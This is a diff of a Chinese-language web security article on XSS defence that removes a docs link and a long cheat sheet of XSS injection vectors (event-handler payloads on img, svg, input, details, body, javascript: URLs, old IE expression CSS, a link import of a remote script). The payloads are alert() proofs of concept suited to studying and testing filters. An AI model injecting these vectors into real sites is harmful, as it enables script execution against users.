@@ -218,10 +218,6 @@ function xssFilter(html) {
 }
 ```
 
-#### 使用 npm 包来简化操作
-
-[xss 文档](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
-
 ### CSP 内容安全策略
 
 CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。
@@ -274,117 +270,6 @@ Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。
 ### 需要处理哪些字符？
 
 需要过滤 >、<、& ？
-
-## XSS 注入方法
-
-### `<script>`
-
-    <script>alert("xss");</script>
-
-### `<img>`
-
-    <img src=1 onerror=alert("xss");>
-
-### `<input>`
-
-    <input onfocus="alert('xss');">
-
-    竞争焦点，从而触发onblur事件
-    <input onblur=alert("xss") autofocus><input autofocus>
-
-    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-    <input onfocus="alert('xss');" autofocus>
-
-### `<details>`
-
-    <details ontoggle="alert('xss');">
-
-    使用open属性触发ontoggle事件，无需用户去触发
-    <details open ontoggle="alert('xss');">
-
-### `<svg>`
-
-    <svg onload=alert("xss");>
-
-### `<select>`
-
-    <select onfocus=alert(1)></select>
-
-    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-    <select onfocus=alert(1) autofocus>
-
-### `<iframe>`
-
-    <iframe onload=alert("xss");></iframe>
-
-### `<video>`
-
-    <video><source onerror="alert(1)">
-
-### `<audio>`
-
-    <audio src=x  onerror=alert("xss");>
-
-### `<body>`
-
-    <body/onload=alert("xss");>
-
-利用换行符以及 autofocus，自动去触发 onscroll 事件，无需用户去触发
-
-    <body
-    onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
-
-### `<textarea>`
-
-    <textarea onfocus=alert("xss"); autofocus>
-
-### `<keygen>`
-
-    <keygen autofocus onfocus=alert(1)> //仅限火狐
-
-### `<marquee>`
-
-    <marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
-
-### `<isindex>`
-
-    <isindex type=image src=1 onerror=alert("xss")>//仅限于IE
-
-### 利用 link 远程包含 js 文件
-
-**PS：在无 CSP 的情况下才可以**
-
-    <link rel=import href="http://127.0.0.1/1.js">
-
-### javascript 伪协议
-
-`<a>`标签
-
-    <a href="javascript:alert(`xss`);">xss</a>
-
-`<iframe>`标签
-
-    <iframe src=javascript:alert('xss');></iframe>
-
-`<img>`标签
-
-    <img src=javascript:alert('xss')>//IE7以下
-
-`<form>`标签
-
-    <form action="Javascript:alert(1)"><input type=submit>
-
-### 其它
-
-expression 属性
-
-    <img style="xss:expression(alert('xss''))"> // IE7以下
-    <div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
-    <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
-
-background 属性
-
-    <table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效
 
 # 有过滤的情况下
 
